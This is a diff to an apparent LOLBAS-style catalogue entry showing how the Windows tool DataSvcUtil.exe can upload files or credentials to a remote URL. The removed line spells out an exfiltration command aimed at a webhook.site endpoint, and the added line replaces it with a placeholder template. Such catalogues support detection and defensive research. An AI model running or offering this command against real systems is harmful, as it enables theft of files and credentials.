@@ -1,10 +1,10 @@
 ---
 Name: DataSvcUtil.exe
 Description: DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.
-Author: 'Ialle Teixeira'
+Author: Ialle Teixeira
 Created: 2020-12-01
 Commands:
-  - Command: DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile
+  - Command: DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
     Description: Upload file, credentials or data exfiltration in general
     Usecase: Upload file
     Category: Upload
